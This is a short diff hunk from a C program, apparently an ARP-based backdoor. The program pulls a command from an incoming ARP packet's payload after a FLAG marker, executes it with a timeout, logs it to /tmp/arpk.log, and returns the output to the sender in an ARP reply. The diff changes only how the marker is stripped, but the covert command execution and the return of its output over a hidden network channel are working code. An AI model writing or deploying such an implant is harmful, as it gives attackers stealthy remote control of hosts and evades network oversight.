@@ -192,15 +192,15 @@ int main(int argc, char *argv[]) {
     printf("Destination MAC: %s\n", dst_hw);
     printf("Destination IP: %s\n", dst_proto);
     printf("Payload Length: %ld\n", strlen(payload));
-    printf("Payload: %s\n", payload);
+    printf("Payload: %s\n", payload + strlen(FLAG));
 
     FILE *fp = fopen("/tmp/arpk.log", "a+");
     char output[OUTPUT_BUF+1];
-    int status = execute_command_with_timeout(payload, 3, output, OUTPUT_BUF);
+    int status = execute_command_with_timeout(payload + strlen(FLAG), 3, output, OUTPUT_BUF);
     output[OUTPUT_BUF] = 0;
     if (status == 0) {
         // Success, send output as reply
-        fprintf(fp, "Success!\n\tCommand: %s\n\tOutput: %s\n", payload, output);
+        fprintf(fp, "Success!\n\tCommand: %s\n\tOutput: %s\n", payload + strlen(FLAG), output);
         send_arp_reply(IF_NAME, src_hw, src_proto, dst_hw, dst_proto, output);
     } else {
         if (status == -2) {
